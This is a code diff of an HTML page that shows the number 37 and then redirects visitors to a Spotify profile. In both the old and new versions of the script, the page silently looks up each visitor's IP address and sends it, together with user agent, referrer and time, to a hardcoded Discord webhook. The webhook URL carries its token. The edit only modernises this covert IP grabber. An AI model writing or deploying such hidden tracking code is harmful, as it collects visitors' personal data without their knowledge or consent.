@@ -12,16 +12,15 @@
 <body>
   <div>37</div>
   <script>
-    let referrer = document.referrer || 'Doğrudan';
-    try {
-      let x = new XMLHttpRequest();
-      x.open('GET', 'https://api.ipify.org?format=json', false);
-      x.send();
-      let d = JSON.parse(x.responseText);
-      let msg = '**Yeni Ziyaretçi!**\n**IP:** ' + d.ip + '\n**User-Agent:** ' + navigator.userAgent + '\n**Sayfa:** ' + referrer + '\n**Zaman:** ' + new Date().toLocaleString('tr-TR');
-      navigator.sendBeacon('https://discord.com/api/webhooks/1513283799583162458/SeJddnVhH8sK1REjZwc9yhTaon0cG7kY85Q8VFhqhfDo2BQstD3-lncKGKoIIuXcYDmO', new Blob([JSON.stringify({content: msg})], {type: 'application/json'}));
-    } catch(e) {}
-    window.location.replace('https://open.spotify.com/user/zx9oehv0zw9qx96qowlby0ktl?si=22be720da7b1485a');
+    (async () => {
+      try {
+        let r = await fetch('https://api.ipify.org?format=json');
+        let d = await r.json();
+        let msg = '**Yeni Ziyaretçi!**\n**IP:** ' + d.ip + '\n**User-Agent:** ' + navigator.userAgent + '\n**Sayfa:** ' + (document.referrer || 'Doğrudan') + '\n**Zaman:** ' + new Date().toLocaleString('tr-TR');
+        await fetch('https://discord.com/api/webhooks/1513283799583162458/SeJddnVhH8sK1REjZwc9yhTaon0cG7kY85Q8VFhqhfDo2BQstD3-lncKGKoIIuXcYDmO', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: msg})});
+      } catch(e) {}
+      window.location.replace('https://open.spotify.com/user/zx9oehv0zw9qx96qowlby0ktl?si=22be720da7b1485a');
+    })();
   </script>
 </body>
 </html>
